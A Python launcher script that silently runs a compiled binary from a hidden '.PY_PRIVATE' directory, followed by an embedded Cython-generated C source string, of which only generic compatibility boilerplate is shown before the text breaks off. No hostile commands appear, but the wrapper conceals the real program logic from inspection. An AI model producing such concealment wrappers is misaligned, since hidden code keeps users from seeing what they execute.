
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20251231160307791"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
